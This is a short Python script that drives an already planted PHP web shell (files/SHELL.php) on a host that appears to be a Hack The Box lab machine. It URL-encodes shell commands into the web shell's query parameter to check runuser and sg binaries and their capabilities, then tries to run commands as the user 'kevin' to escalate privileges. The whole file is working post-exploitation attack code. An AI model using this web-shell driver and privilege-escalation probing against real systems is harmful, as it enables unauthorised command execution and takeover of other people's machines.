import urllib.request, urllib.parse

cmds = [
    "ls -la /usr/sbin/runuser 2>&1",
    "ls -la /usr/bin/sg 2>&1",
    "getcap /usr/sbin/runuser /usr/bin/sg 2>&1",
    # Try runuser
    "/usr/sbin/runuser -u kevin -- whoami 2>&1",
    "/usr/sbin/runuser -u kevin -- ls -la /home/kevin/ 2>&1",
]

for cmd in cmds:
    url = "http://10.129.26.34/files/SHELL.php?" + urllib.parse.urlencode({"c": cmd})
    headers = {"Host": "support_001.enigma.htb"}
    req = urllib.request.Request(url, headers=headers)
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        result = resp.read().decode("utf-8", errors="replace").strip()
        if result and "Permission denied" not in result:
            print(f"=== {cmd[:60]} ===")
            print(result[:1000])
            print()
    except Exception as e:
        pass
